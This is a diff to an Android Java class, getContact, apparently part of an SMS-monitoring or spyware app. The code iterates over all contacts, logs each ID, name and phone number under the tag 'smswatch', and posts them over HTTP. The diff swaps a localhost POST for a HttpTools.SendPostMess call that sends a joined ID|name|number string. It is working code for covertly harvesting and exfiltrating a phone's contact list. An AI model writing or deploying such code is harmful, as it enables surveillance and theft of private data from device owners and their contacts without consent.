@@ -6,8 +6,6 @@ import android.database.Cursor;
 import android.provider.ContactsContract;
 import android.util.Log;
 
-import java.util.HashMap;
-import java.util.Map;
 
 
 public class getContact{
@@ -19,8 +17,6 @@ public class getContact{
             String ContactId = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
             Cursor phone = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, ContactsContract.CommonDataKinds.Phone.CONTACT_ID + "=" + ContactId, null, null);
             while (phone.moveToNext()) {
-                Map<String,String> pmap = new HashMap<String, String>();
-                Map<String,String> hmap = new HashMap<String, String>();
                 String PhoneNumber = phone.getString(phone.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                 String PhoneName = phone.getString(phone.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                 PhoneNumber = PhoneNumber.replace("-", "");
@@ -28,9 +24,9 @@ public class getContact{
                 Log.i("smswatch",ContactId);
                 Log.i("snswatch",PhoneName);
                 Log.i("smswatch",PhoneNumber);
-                pmap.put(PhoneName, PhoneNumber);
-                hmap.put("abc","123");
-                HttpRequestUtil.sendPost("http://127.0.0.1", pmap, hmap);
+                String d = ContactId + "|" + PhoneName + "|" + PhoneNumber;
+                HttpTools.SendPostMess(d);
+
             }
 
 
